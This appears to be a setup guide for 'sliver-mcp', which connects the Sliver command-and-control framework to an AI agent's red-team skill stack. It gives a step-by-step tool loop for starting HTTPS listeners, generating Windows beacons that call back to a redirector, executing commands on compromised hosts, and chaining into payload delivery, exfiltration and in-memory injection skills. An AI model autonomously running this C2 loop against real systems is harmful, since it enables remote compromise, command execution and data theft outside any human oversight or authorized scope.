# dagar-red integration

`sliver-mcp` is the C2 leg of the dagar-red MCP stack (p0rtix → metasploit →
sliver). The skills already declare `mcp: [sliver]`; this wires the tools they
were written to call.

## Registration

`~/.claude.json`:

```json
"sliver": {
  "type": "stdio",
  "command": "/home/youruser/projects/sliver-mcp/venv/bin/sliver-mcp",
  "args": [],
  "env": { "SLIVER_CONFIG": "/home/youruser/.sliver-client/configs/dagar.cfg" }
}
```

No `.mcp.json` is needed — dagar-red references MCP tools by name
(`mcp__sliver__*`), and `sliver` is already in `scripts/lint_skills.py`'s MCP
enum, so no validator change is required.

## sliver-ops MCP-driven loop

The `sliver-ops` skill's CLI block becomes:

```text
1. mcp__sliver__connect()
2. mcp__sliver__set_noise("yellow")
3. mcp__sliver__start_https_listener(host="0.0.0.0", port=443, domain="<redirector>")
4. mcp__sliver__generate_beacon(c2_host="<redirector>", os="windows",
                                interval=60, jitter=30)   # deliver via payload-delivery
5. mcp__sliver__poll_events()        # watch for the callback
6. mcp__sliver__list_sessions()
7. mcp__sliver__execute_command(target_id, "whoami")      # drive post-ex
8. mcp__sliver__export_handoff()      # feed internal-dispatch
```

**Port 443 is the standing-pool standard.** Every HTTPS listener and pool build
defaults to port **443**, not 4443 — `start_https_listener`, `generate_beacon` /
`generate_implant` / `regenerate_or_build`, and `ingest_handoff` all target 443
when no `port` / `c2_port` is given. Keep the ~5-build standing pool on 443 so a
reused `pool-https-<osarch>` build always calls back on the same port; a build
that drifted to 4443 (generated before this standard) should be evicted with
`remove_implant_build` and rebuilt against 443.

## Cross-tool handoff

`export_handoff()` returns the same shape family as p0rtix's, so the agent can
fold C2 state back into `internal-dispatch`. `ingest_handoff(handoff_data)`
consumes a p0rtix/metasploit-style handoff (keys: `redirector` /
`callback_domain` / `domain` / `lhost` / `host` / `hosts`, plus `protocol`,
`port`, `os`, `arch`) and stands up a matching listener + beacon in one call —
the recon→C2 pivot.

## Related skills

`c2-tradecraft` (doctrine), `payload-delivery` (beacon delivery),
`session-pivoting` (pivots — note the SOCKS/portfwd limitation in the README),
`collection-exfil` (download over the C2 channel), and
`loader-injection-tradecraft` (in-memory stage) all compose with these tools.
